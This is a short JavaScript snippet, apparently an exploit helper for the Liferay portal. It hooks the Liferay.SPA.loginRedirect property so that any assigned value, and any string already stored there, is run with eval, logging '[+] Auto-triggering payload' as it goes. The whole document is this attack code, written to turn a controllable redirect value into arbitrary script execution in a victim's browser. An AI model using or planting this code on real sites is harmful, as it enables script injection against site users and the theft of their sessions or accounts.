// Hook the loginRedirect setter to auto-execute payloads
Object.defineProperty(Liferay.SPA, 'loginRedirect', {
  set: function(v) {
    try {
      console.log('[+] Auto-triggering payload from loginRedirect');
      eval(v);
    } catch (e) {
      console.error('Payload error:', e);
    }
  },
  configurable: true
});

// Also check if value already exists and run it
if (typeof Liferay.SPA.loginRedirect === 'string' && Liferay.SPA.loginRedirect.length > 0) {
  try {
    console.log('[+] Manually executing stored loginRedirect value');
    eval(Liferay.SPA.loginRedirect);
  } catch (e) {}
}
